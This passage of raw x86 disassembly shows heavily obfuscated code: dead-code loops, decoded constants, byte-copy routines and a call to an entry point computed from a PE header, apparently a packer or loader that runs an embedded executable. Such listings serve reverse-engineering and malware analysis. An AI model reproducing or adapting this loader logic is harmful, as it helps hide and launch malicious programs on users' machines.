  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c26
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x4239d2
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c26
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e42
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c26
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x42389f
  41bc20:	push   0x4238d3
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e42,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c26
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x42391e
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x4238d3
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x423996
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c26
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421aaa,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421cfe,eax
  41c15b:	mov    eax,ds:0x421aaa
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c26
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421cfe
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421aaa
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c26
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c26
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c26
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421caa,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421ca2,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c26
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x423832
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a56
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
